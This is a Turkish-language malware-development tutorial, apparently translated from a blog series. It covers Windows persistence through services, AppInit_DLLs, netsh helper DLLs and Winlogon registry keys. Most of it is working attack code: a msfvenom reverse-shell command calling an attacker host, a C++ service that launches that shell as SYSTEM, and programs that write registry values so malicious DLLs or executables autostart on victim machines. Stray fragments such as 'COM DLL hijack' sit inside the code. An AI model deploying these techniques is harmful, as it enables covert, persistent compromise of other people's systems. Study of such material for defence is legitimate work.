70.Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 4. Windows Hizmetleri.
Basit C++ örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu bölüm, Windows kötü amaçlı yazılım kalıcılık teknikleri ve yöntemleri üzerine yazı dizisinin bir sonraki bölümüdür.


Bugün, kendi araştırmalarım sonucunda keşfettiğim bir başka kalıcılık yöntemini ele alacağım: Windows Hizmetleri.
Windows Hizmetleri
Windows Hizmetleri, aşağıdaki nedenlerden dolayı saldırılar için önemlidir:
• Ağ üzerinden doğal olarak çalışırlar – tüm Hizmetler API’si uzak sunucular düşünülerek oluşturulmuştur.
• Sistem açıldığında otomatik olarak başlarlar.
• İşletim sisteminde son derece yüksek ayrıcalıklara sahip olabilirler.
Hizmetleri yönetmek yüksek ayrıcalıklar gerektirir ve ayrıcalıksız bir kullanıcı genellikle yalnızca ayarları görüntüleyebilir. Bu durum yirmi yılı aşkın süredir değişmemiştir.
Windows bağlamında, yanlış yapılandırılmış hizmetler ayrıcalık yükseltmeye yol açabilir veya bir kalıcılık yöntemi olarak kullanılabilir.
Bu nedenle, yeni bir hizmet oluşturmak Yönetici kimlik bilgileri gerektirir ve gizli bir kalıcılık yöntemi değildir.
Pratik Örnek
Pratik bir örnek ele alalım: bizim için ters bağlantı kabuğu (reverse shell) alacak bir Windows hizmeti nasıl oluşturulur ve çalıştırılır?
Öncelikle, saldırgan makinemde msfvenom kullanarak ters kabuk çalıştırılabilir dosyasını oluşturuyorum:
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe

+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, hedef makinede meow.exe çalıştıracak bir hizmet oluşturun.
Bir hizmetin minimum gereksinimleri şunlardır:
Ana giriş noktası (Main Entry Point, herhangi bir uygulamada olduğu gibi)
Hizmet giriş noktası (Service Entry Point)
Hizmet kontrol işleyicisi (Service Control Handler)
Ana giriş noktasında, StartServiceCtrlDispatcher işlevini hızlıca çağırarak SCM'nin hizmet giriş noktanızı (ServiceMain) çağırmasını sağlarsınız:
int main() {
SERVICE_TABLE_ENTRY ServiceTable[] = {
{"MeowService", (LPSERVICE_MAIN_FUNCTION) ServiceMain},
{NULL, NULL}
};

StartServiceCtrlDispatcher(ServiceTable);
return 0;
}
Hizmet Ana Giriş Noktası (Service Main Entry Point) aşağıdaki görevleri yerine getirir:
Ana Giriş Noktası'ndan ertelenen gerekli şeyleri başlatın.
Hizmet kontrol işleyicisini (ControlHandler) kaydedin; bu, Hizmeti Durdur (Service Stop), Duraklat (Pause), Devam Ettir (Continue) vb. kontrol komutlarını işleyecektir.
Bunlar, SERVICE STATUS yapısının dwControlsAccepted alanı aracılığıyla bir bit maskesi olarak kaydedilir.
Hizmet durumunu SERVICE RUNNING olarak ayarlayın.
threads/events/mutex/IPCs vb. oluşturma gibi başlatma prosedürlerini gerçekleştirin.
void ServiceMain(int argc, char** argv) {
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
serviceStatus.dwControlsAccepted =
SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
serviceStatus.dwWin32ExitCode = 0;
serviceStatus.dwServiceSpecificExitCode = 0;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

hStatus = RegisterServiceCtrlHandler("MeowService",
(LPHANDLER_FUNCTION)ControlHandler);
RunMeow();

serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus (hStatus, &serviceStatus);

while (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
	Sleep(SLEEP_TIME);
}
return;
}

Hizmet Kontrol İşleyicisi (Service Control Handler), Hizmet Ana Giriş Noktası'nda (Service Main Entry Point) kaydedildi. Her hizmetin, SCM'den gelen kontrol isteklerini işlemek için bir işleyiciye sahip olması gerekir:

void ControlHandler(DWORD request) {
switch(request) {
case SERVICE_CONTROL_STOP:
serviceStatus.dwWin32ExitCode = 0;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus (hStatus, &serviceStatus);
return;

case SERVICE_CONTROL_SHUTDOWN:
serviceStatus.dwWin32ExitCode = 0;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus (hStatus, &serviceStatus);
return;

default:
	break;COM DLL hijack
}
SetServiceStatus(hStatus, &serviceStatus);
return;
}
Yalnızca SERVICE_CONTROL_STOP ve SERVICE_CONTROL_SHUTDOWN isteklerini uyguladım ve destekledim. SERVICE_CONTROL_CONTINUE, SERVICE_CONTROL_INTERROGATE, SERVICE_CONTROL_PAUSE, SERVICE_CONTROL_SHUTDOWN ve diğerleri gibi istekleri de işleyebilirsiniz.


Ayrıca, kötü amaçlı mantık içeren bir fonksiyon oluşturun:
// run process meow.exe - reverse shell
int RunMeow() {
void * lb;
BOOL rv;
HANDLE th;

// for example:
// msfvenom -p windows/x64/shell_reverse_tcp
// LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe
char cmd[] = "Z:\\2022-05-09-malware-pers-4\\meow.exe";
STARTUPINFO si;
PROCESS_INFORMATION pi;
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL,
NULL, &si, &pi);
WaitForSingleObject(pi.hProcess, INFINITE);
CloseHandle(pi.hProcess);
return 0;
}

int main() {
SERVICE_TABLE_ENTRY ServiceTable[] = {
{"MeowService",
(LPSERVICE_MAIN_FUNCTION) ServiceMain},
{NULL, NULL}
};

StartServiceCtrlDispatcher(ServiceTable);
return 0;
}
Daha önce yazdığım gibi, sadece ters kabuk sürecimizi (meow.exe) oluşturun:

+++++++++++++++++++++++++++++++++++++++++++++++

Elbette, bu kod bir referans değil ve daha çok "kirli" bir Kavramsal Kanıt (Proof of Concept) niteliğindedir.
Demo
Hadi her şeyi adım adım gösterelim.
Servisimizi derleyelim:
x86_64-w64-mingw32-g++ -O2 meowsrv.cpp -o meowsrv.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Hedef makinede (Windows 10 x64) hizmeti komut satırından aşağıdaki komutu çalıştırarak yükleyebiliriz. Unutmayın, tüm komutlar yönetici olarak çalıştırılmalıdır:

sc create MeowService binpath= \
"Z:\2022-05-09-malware-pers-4\meowsrv.exe" \
start= auto

+++++++++++++++++++++++++++++++++++++++++++++++

Control et:
sc query MeowService

+++++++++++++++++++++++++++++++++++++++++++++++

Eğer Process Hacker'ı açarsak, Hizmetler (Services) sekmesinde bunu görebiliriz:
+++++++++++++++++++++++++++++++++++++++++++++++

Eğer özelliklerini kontrol edersek:
+++++++++++++++++++++++++++++++++++++++++++++++
LocalSystem hesabı, hizmet kontrol yöneticisi tarafından kullanılan önceden tanımlanmış bir yerel hesaptır. Yerel bilgisayar üzerinde geniş ayrıcalıklara sahiptir ve ağ üzerinde bilgisayar olarak hareket eder. Belirteci (token) NT AUTHORITY\SYSTEM ve BUILTIN\Administrators SID'lerini içerir; bu hesaplar çoğu sistem nesnesine erişim sağlar.
Hesabın adı tüm yerel ayarlarda . \LocalSystem olarak geçer. Ayrıca LocalSystem veya ComputerName\LocalSystemadı da kullanılabilir. Bu hesabın bir parolası yoktur. Eğer CreateService veya ChangeServiceConfig fonksiyonlarını çağırırken LocalSystem hesabını belirtirseniz, sağladığınız parola bilgisi MSDN tarafından göz ardı edilir.
Daha sonra, aşağıdaki komutla hizmeti başlatın:
sc start MeowService

+++++++++++++++++++++++++++++++++++++++++++++++

Ve gördüğünüz gibi, ters kabuğu (reverse shell) aldık!:
+++++++++++++++++++++++++++++++++++++++++++++++
MeowService hizmetimiz PID: 5668 aldı:
+++++++++++++++++++++++++++++++++++++++++++++++

Daha sonra Process Hacker'ı yönetici olmayan bir kullanıcı olarak çalıştırın:

+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, kullanıcı adını göstermiyor. Ancak, Process Hacker'ı Yönetici olarak çalıştırmak durumu değiştiriyor ve ters kabuğun NT AUTHORITY\SYSTEM hesabı adına çalıştığını görebiliyoruz:
+++++++++++++++++++++++++++++++++++++++++++++++
Bunu Ağ (Network) sekmesinde de göreceğiz:
+++++++++++++++++++++++++++++++++++++++++++++++
Her şey mükemmel çalıştı :)
Şimdi deneyler tamamlandıktan sonra temizleme işlemlerini yapalım. Hizmeti durdurun:
sc stop MeowService
+++++++++++++++++++++++++++++++++++++++++++++++
Yani, MeowService başarıyla durduruldu.Ve eğer onu silersek:
sc delete MeowService
+++++++++++++++++++++++++++++++++++++++++++++++
Process Hacker’ın bu işlemle ilgili bildirimini görebiliriz.


Ancak burada çok önemli bir nokta var.Muhtemelen neden doğrudan şu komutu çalıştırmadığımızı merak ediyorsunuz:
sc create MeowService \
binpath= "Z:\2022-05-09-pers-4\meow.exe" \
start= auto

Çünkü meow.exe aslında bir hizmet (service) değildir. Daha önce belirttiğim gibi, bir hizmetin minimum gereksinimleri belirli fonksiyonları içermelidir: main entry point, service entry point ve service control handler. Eğer sadece meow.exe üzerinden bir hizmet oluşturmaya çalışırsanız, işlem hata vererek sonlanacaktır.
Sonuç
Bu teknik yeni değil, ancak özellikle giriş seviyesindeki Blue Team uzmanlarının dikkatini çekmeye değer. Tehdit aktörleri, yeni hizmetler oluşturmak yerine mevcut Windows hizmetlerini de değiştirebilirler. Bu yöntem, APT 38, APT 32 ve APT 41 gibi gruplar tarafından sıklıkla kullanılmıştır.
MITTRE ATT&CK. Create or Modify System Process: Windows Service
APT 32
APT 38
APT 41
Github’taki kaynak kod

/altbölüm{71. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 5. AppInit_DLLs. Basit C++ Örneği}

+++++++++++++++++++++++++++++++++++++++++++++++

Bu bölüm, Windows'ta kötü amaçlı yazılım kalıcılığına yönelik teknikler ve yöntemler serisinin bir sonraki parçasıdır.
Bugün, kendi araştırmalarımın bir sonucu olarak keşfettiğim başka bir kalıcılık yöntemini ele alacağım: AppInit_DLLs.
Windows işletim sistemleri, neredeyse tüm uygulama süreçlerinin özel DLL'leri adres alanlarına yüklemesine olanak tanıyan bir özelliğe sahiptir. Bu, herhangi bir DLL'in sistemde uygulama süreçleri oluşturulduğunda yüklenip çalıştırılmasına izin verdiğinden, bir kalıcılık yöntemi olarak kullanılabilir.
AppInit DLL'leri
Bu yöntemi uygulamak için yönetici düzeyinde ayrıcalıklara sahip olmak gereklidir. AppInit üzerinden DLL yüklemelerini düzenleyen aşağıdaki kayıt defteri anahtarları bulunmaktadır:
• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows
- 32-bit
• HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\WindowsNT\CurrentVersion\Windows - 64-bit
İlgilendiğimiz değerler şunlardır:
reg query \
"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /s

+++++++++++++++++++++++++++++++++++++++++++++++

Ve 64 bit için:
reg query \
"HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\
Windows" \
/s

+++++++++++++++++++++++++++++++++++++++++++++++

Microsoft, Windows kullanıcılarını kötü amaçlı yazılımlardan korumak için AppInit DLL’leri üzerinden DLL yüklemeyi varsayılan olarak devre dışı bırakmıştır (LoadAppInit_DLLs). Ancak, LoadAppInit_DLLs kayıt defteri anahtarını 1olarak ayarlayarak bu özelliği etkinleştirebiliriz.
Pratik Örnek
Öncelikle, kötü amaçlı bir DLL oluşturalım. Her zamanki gibi, "meow-meow" mesaj kutusunu açan bir mantık kullanacağım:
/*
evil.cpp
inject via Appinit_DLLs
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/16/malware-pers-5.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

extern "C" {
__declspec(dllexport) BOOL WINAPI runMe(void) {
MessageBoxA(NULL, "Meow-meow!", "=^..^=", MB_OK);
return TRUE;
}
}

BOOL APIENTRY DllMain(HMODULE hModule,
DWORD nReason, LPVOID lpReserved) {
switch (nReason) {
case DLL_PROCESS_ATTACH:
runMe();
break;
case DLL_PROCESS_DETACH:
	break;
case DLL_THREAD_ATTACH:
	break;
case DLL_THREAD_DETACH:
	break;
}
return TRUE;
}


Haydi şunu derleyelim:

x86_64-w64-mingw32-gcc -shared -o evil.dll evil.cpp -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Ardından basit bir mantık uygulayarak, AppInit_DLLs kayıt defteri anahtarını evil.dll dosyasının yolunu içerecek şekilde değiştiriyoruz. Bunun sonucunda evil.dll otomatik olarak yüklenecektir.
Bunun için başka bir uygulama olan pers.cpp dosyasını oluşturalım:
/*
pers.cpp
windows low level persistense via Appinit_DLLs
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/16/malware-pers-5.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;
// malicious DLL
const char* dll = "Z:\\2022-05-16-malware-pers-5\\evil.dll";
// activation
DWORD act = 1;

// 32-bit and 64-bit
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
(LPCSTR)
"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// create new registry keys
RegSetValueEx(hkey, (LPCSTR)"LoadAppInit_DLLs",
0, REG_DWORD, (const BYTE*)&act, sizeof(act));
RegSetValueEx(hkey, (LPCSTR)"AppInit_DLLs",
0, REG_SZ, (unsigned char*)dll, strlen(dll));
RegCloseKey(hkey);
}

res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
(LPCSTR)
"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\
Windows",
0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// create new registry keys
RegSetValueEx(hkey, (LPCSTR)"LoadAppInit_DLLs",
0, REG_DWORD, (const BYTE*)&act, sizeof(act));
RegSetValueEx(hkey, (LPCSTR)"AppInit_DLLs",
0, REG_SZ, (unsigned char*)dll, strlen(dll));
RegCloseKey(hkey);
}
return 0;
}
Gördüğünüz gibi, LoadAppInit_DLLs kayıt defteri anahtarını 1 olarak ayarlamak da önemlidir.
Şimdi bunu derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Demo
Hadi her şeyi çalışırken görelim! Tüm dosyaları kurbanın makinesine (benim durumumda Windows 10 x64) aktarın.
Ardından, Yönetici olarak çalıştırın:

.\pers.exe

Ve:

reg query \
"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" \
/s
reg query \
"HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\
Windows" /s

Sadece control edelim

+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, gösterim amacıyla Paint veya Not Defteri gibi bir uygulama açın:

+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Bu nedenle, her şey mükemmel şekilde çalıştı :)

İkinci örnek:
Bununla birlikte, bu yöntemin uygulanması hedef sistemde kararlılık ve performans sorunlarına neden olabilir:

+++++++++++++++++++++++++++++++++++++++++++++++

Ayrıca, ilk DLL'in mantığının oldukça garip olduğunu düşünüyorum, çünkü birden fazla mesaj kutusu açılıyor. Gerçek hayatta red team senaryolarında hareket ettiğimizde bu oldukça gürültülü oluyor, özellikle birden fazla ters bağlantı (reverse shell) oluşturulduğunda.
Bu yüzden, evil.dll mantığını biraz güncellemeyi denedim:
/*
evil2.cpp
inject via Appinit_DLLs - only for `mspaint.exe`
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/16/malware-pers-5.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

char* subStr(char *str, char *substr) {
while (*str) {
char *Begin = str;
char *pattern = substr;
while (*str && *pattern && *str == *pattern) {
str++;
pattern++;
}
if (!*pattern)
return Begin;
str = Begin + 1;
}
	return NULL;
	}

extern "C" {
__declspec(dllexport) BOOL WINAPI runMe(void) {
MessageBoxA(NULL, "Meow-meow!", "=^..^=", MB_OK);
return TRUE;
}
}

BOOL APIENTRY DllMain(HMODULE hModule,
DWORD nReason, LPVOID lpReserved) {
char path[MAX_PATH];
switch (nReason) {
	   case DLL_PROCESS_ATTACH:
GetModuleFileName(NULL, path, MAX_PATH);
if (subStr(path, (char *)"paint")) {
	runMe();
}
break;
	     case DLL_PROCESS_DETACH:
break;
                 case DLL_THREAD_ATTACH:
break;
                  case DLL_THREAD_DETACH:
break;
}
return TRUE;
}

Gördüğünüz gibi, eğer mevcut süreç Paint ise (ve 32-bit ise), o zaman "enjekte et" :)

+++++++++++++++++++++++++++++++++++++++++++++++

Mükemmel! :)

+++++++++++++++++++++++++++++++++++++++++++++++

Deneyler bittikten sonra temizleme işlemi için:
reg add \
"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" \
/v LoadAppInit_DLLs /d 0
reg add \
"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" \
/v AppInit_DLLs /t REG_SZ /f

+++++++++++++++++++++++++++++++++++++++++++++++

Bu teknik yeni değildir, ancak buna dikkat etmek gerekir. Gerçek saldırılarda, bu numara genellikle APT 39 gibi gruplar ve Ramsay gibi kötü amaçlı yazılımlar tarafından kullanılmıştır.

MITRE ATT&CK: APPInit_DLLs
APT39
Ramsay
Github’taki kaynak kod

72.Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 6. Windows netsh Yardımcı DLL'i. Basit C++ Örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu bölüm, Windows kötü amaçlı yazılım kalıcılık teknikleri ve hileleri üzerine yazılmış bir dizi makalenin bir sonraki parçasıdır.
Bugün, kendi araştırmalarım sonucunda keşfettiğim bir başka kalıcılık tekniği olan Netsh Helper DLL hakkında yazacağım.
Netsh
Netsh, Windows yöneticilerinin ana makine tabanlı Windows güvenlik duvarını değiştirmek ve ağ yapılandırma görevlerini gerçekleştirmek için kullanabileceği bir Windows yardımcı programıdır. Netsh’in işlevselliği, DLL dosyalarıaracılığıyla genişletilebilir.
Bu özellik, kırmızı takım operatörlerinin keyfi DLL'leri yükleyerek kod yürütme gerçekleştirmesine ve dolayısıyla bu aracı kullanarak kalıcılık sağlamasına olanak tanır. Ancak, bu tekniğin uygulanabilmesi için yerel yönetici ayrıcalıklarıgereklidir.
Pratik Örnek
Şimdi, pratik bir örnek üzerinden ilerleyelim. Öncelikle kötü amaçlı bir DLL oluşturalım:
/*
evil.cpp
simple DLL for netsh
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/29/malware-pers-6.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

extern "C" __declspec(dllexport)
DWORD InitHelperDll(
DWORD dwNetshVersion, PVOID pReserved) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}


Şimdi derleyelim:

x86_64-w64-mingw32-gcc -shared -o evil.dll evil.cpp -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Ve bu kötü amaçlı DLL, hedef kurbanın makinesine aktarılır.
Netsh, işletim sisteminin diğer bileşenleriyle dinamik bağlantı kitaplığı (DLL) dosyaları aracılığıyla etkileşime girer.Her Netsh yardımcı DLL'si, kapsamlı bir işlev kümesi sunar.Netsh'in işlevselliği, DLL dosyaları kullanılarak genişletilebilir ve bu da saldırganların kötü amaçlı kodlarını yürütmelerine olanak tanır:
reg query "HKLM\Software\Microsoft\NetSh" /s
+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, add helper komutu kullanılarak DLL, netsh yardımcı programına kaydedilebilir:
netsh
add helper Z:\2022-05-29-malware-pers-6\evil.dll

+++++++++++++++++++++++++++++++++++++++++++++++

+++++++++++++++++++++++++++++++++++++++++++++++

Her şey mükemmel çalıştı!

Ancak, netsh varsayılan olarak otomatik başlatılacak şekilde yapılandırılmamıştır.
Kalıcılık, Windows başlangıcında uygulamayı çalıştıran bir kayıt defteri anahtarı oluşturarak sağlanabilir.
Bu işlem aşağıdaki komut dosyasıyla hemen gerçekleştirilebilir:

/*
pers.cpp
windows persistence via netsh helper DLL
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/29/malware-pers-6.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

// netsh
const char* netsh = "C:\\Windows\\SysWOW64\\netsh";

// startup
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
0 , KEY_WRITE, &hkey);

if (res == ERROR_SUCCESS) {
// create new registry key
RegSetValueEx(hkey, (LPCSTR)"hack",
0, REG_SZ, (unsigned char*)netsh, strlen(netsh));
RegCloseKey(hkey);
}
return 0;
}

Gördüğünüz gibi, bu yöntem kayıt defteri çalıştırma anahtarları (run keys) aracılığıyla kalıcılık sağladığımız önceki yazımdaki betiğe benziyor.
Kayıt defteri çalıştırma anahtarlarını kontrol etmek için aşağıdaki komutu çalıştırabilirsiniz:
reg query \
"HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
/s

+++++++++++++++++++++++++++++++++++++++++++++++

Şunu derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

ve kurbanın makinesinde çalıştıralım:

.\pers.exe

+++++++++++++++++++++++++++++++++++++++++++++++

Bu komut çalıştırıldığında, aşağıdaki kayıt defteri anahtarı oluşturulur:
+++++++++++++++++++++++++++++++++++++++++++++++

Ancak bir husus var. PoC'nin mantığının, payload yürütülürken netsh'in hala kullanılabilmesini sağlamak için yeni bir iş parçacığı oluşturacak şekilde güncellenmesi gerekir. Ancak, netsh sona erdiğinde, kötü niyetli mantığınız da sona erer.
Şimdi deneyelim. Yeni bir DLL oluşturun (evil2.cpp):
/*
evil2.cpp
simple DLL for netsh
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/29/malware-pers-6.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

DWORD WINAPI Meow(LPVOID lpParameter) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 1;
}

extern "C" __declspec(dllexport)
DWORD InitHelperDll(
DWORD dwNetshVersion, PVOID pReserved) {
HANDLE hl = CreateThread(NULL, 0, Meow, NULL, 0, NULL);
CloseHandle(hl);
return 0;
}

Derleyelim:
x86_64-w64-mingw32-gcc -shared -o evil2.dll evil2.cpp -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Ve adımları tekrar çalıştırın:
netsh
add helper Z:\2022-05-29-malware-pers-6\evil2.dll

+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey yolunda, netsh hala kullanılabilir. Ve kayıt defteri anahtarını doğruluk açısından kontrol edebiliriz:

reg query "HKLM\Software\Microsoft\NetSh" /s

+++++++++++++++++++++++++++++++++++++++++++++++

Bu tür bir saldırı, sistem özelliklerinin istismarına dayandığı için önleyici kontrollerle kolayca engellenemez.

netsh
MITRE ATT&CK: Netsh Helper DLL
Github’taki kaynak kod


73. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 7. Winlogon. Basit C++ Örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bugün, kendi araştırmalarımın sonucu olarak keşfettiğim başka bir kalıcılık tekniği olan Winlogon kayıt defteri anahtarları hakkında yazacağım.
Winlogon
Winlogon işlemi, kullanıcı giriş ve çıkışlarından, sistemin başlatılıp kapatılmasından ve ekranın kilitlenmesinden sorumludur. Kötü amaçlı yazılım yazarları, Winlogon işleminin kullandığı kayıt defteri girdilerini değiştirerek kalıcılık sağlayabilir.
Bu kalıcılık tekniğini uygulamak için aşağıdaki kayıt defteri anahtarlarının değiştirilmesi gerekir:
• HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
• HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
Ancak, bu tekniği uygulamak için yerel yönetici ayrıcalıkları gereklidir.
Pratik Örnek
Öncelikle, kötü amaçlı uygulamamızı oluşturalım (hack.cpp):
/*
meow-meow messagebox
author: @cocomelonc
*/
#include <windows.h>
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE
hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
MessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
	return 0;
}
Gördüğünüz gibi, her zamanki gibi sadece bir "meow" mesajı açılır penceresi görünecek.
Hadi derleyelim:

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++


Oluşturulan hack.exe dosyası, hedef kurbanın makinesine yerleştirilmelidir.
Shell kayıt defteri anahtarına yapılan değişiklikler, Windows oturumu açıldığında explorer.exe ve hack.exe dosyalarının çalıştırılmasına neden olacaktır.
Bu işlem aşağıdaki komut dosyası kullanılarak hemen gerçekleştirilebilir:
/*
pers.cpp
windows persistence via winlogon keys
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/06/12/malware-pers-7.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;
// shell
// const char* sh = "explorer.exe,
// Z:\\2022-06-12-malware-pers-7\\hack.exe";
const char* sh = "explorer.exe,hack.exe";

// startup
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
(LPCSTR)
"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// create new registry key
// reg add
// "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
// NT\CurrentVersion\Winlogon"
// /v "Shell" /t REG_SZ /d "explorer.exe,..." /f
RegSetValueEx(hkey, (LPCSTR)"Shell", 0, REG_SZ,
(unsigned char*)sh, strlen(sh));
RegCloseKey(hkey);
}
return 0;
}

Benzer şekilde Userinit için de aynı durum geçerlidir.
Bu kayıt defteri anahtarı kötü amaçlı bir uygulama içerdiğinde, Windows oturumu açıldığında userinit.exe ve hack.exe dosyaları çalıştırılacaktır:
/*
pers.cpp
windows persistence via winlogon keys
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/06/12/malware-pers-7.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;
// userinit
const char* ui = "C:\\Windows\\System32\\userinit.exe,
Z:\\2022-06-12-malware-pers-7\\hack.exe";

// startup
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
(LPCSTR)
"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// create new registry key
// reg add
// "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
// NT\CurrentVersion\Winlogon"
// /v "Shell" /t REG_SZ /d "explorer.exe,..." /f
RegSetValueEx(hkey, (LPCSTR)"Userinit", 0,
REG_SZ, (unsigned char*)ui, strlen(ui));
RegCloseKey(hkey);
}
return 0;
}

Bu nedenle, kalıcılıktan sorumlu olan programı derleyelim:

x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Demo


Ve her şeyi çalışırken görelim. Öncelikle, kayıt defteri anahtarlarını kontrol edin:
req query \
"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" \
/s
+++++++++++++++++++++++++++++++++++++++++++++++

Kötü amaçlı uygulamayı C:\Windows\System32\ dizinine kopyalayıp ve çalıştıralım:

.\pers.exe
+++++++++++++++++++++++++++++++++++++++++++++++

Ardından oturumu kapatıp tekrar açın:
+++++++++++++++++++++++++++++++++++++++++++++++

Kötü amaçlı programımızın mantığına göre, "meow-meow" mesaj kutusu açıldı:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Process Hacker 2 üzerinden işlem özelliklerini kontrol edelim:
+++++++++++++++++++++++++++++++++++++++++++++++

Sonra temizleyelim:
reg add \
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
NT\CurrentVersion\Winlogon" \
/v "Shell" /t REG_SZ /d "explorer.exe" /f

+++++++++++++++++++++++++++++++++++++++++++++++

Peki ya başka bir anahtar olan Userinit.exe? Hadi kontrol edelim. Çalıştırın:

.\pers.exe

+++++++++++++++++++++++++++++++++++++++++++++++

Oturumu aç ve kapat:

+++++++++++++++++++++++++++++++++++++++++++++++

+++++++++++++++++++++++++++++++++++++++++++++++

